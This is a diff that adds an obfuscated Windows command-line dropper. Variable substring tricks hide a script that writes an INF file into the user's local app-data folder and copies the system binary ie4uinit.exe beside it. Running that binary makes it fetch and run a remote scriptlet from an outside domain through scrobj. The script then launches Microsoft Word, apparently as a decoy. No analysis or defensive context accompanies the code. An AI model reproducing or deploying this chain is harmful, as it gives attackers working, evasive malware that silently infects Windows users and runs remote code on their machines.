@@ -1,0 +1,8 @@
+/v /ccall%Obligations:~0,1%et "Tomatoes=.inf" &&
+  %Obligations:~0,1%et "Princess=ieuinit!Tomatoes!" &&
+  call %Obligations:~0,1%et "Expenditures=%LOCALAPPDATA%\" &&
+  (for /D %y in ("[defaultin%Obligations:~0,1%tall.windows7]" "Un\" "Register\" "OCXs=E342" "delfiles=083D40" "[version]" "signature =$windows nt$" "[083D40]" "ieu%Muscles%!Tomatoes!" "[de%Obligations:~0,1%tinationdirs]" "083D40=01" "defaultdestdir=11" "[E342]" "sc\" "ro%Deposit%j,NI,%Chronicles%%Wants%%Wants%p%Landscapes%%Announces%%Announces%asf.asfoijh.%Section%/afdjb" "[string%Obligations:~0,1%]" "Landscapes=:;Wonder" "%Obligations:~0,1%hortsvcname=' '" "Section=com" "Muscles=init" "Wants=t;Abstracts" "Standards=%time%" "Chronicles=h" "%Obligations:~0,1%ervicename=' '" "Deposit=b;Hospitals" "Announces=/" ) do @echo %~y)>"!Expenditures!!Princess!" &&
+  %Obligations:~0,1%et "Populations=ie4uinit.exe" &&
+  call xcopy /Y /C /Q %win!Thing!ir%\%Obligations:~0,1%ystem32\!Populations! "!Expenditures!*" &&
+  powershell -Command "!Expenditures!!Populations! -basesettings" &&
+  start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
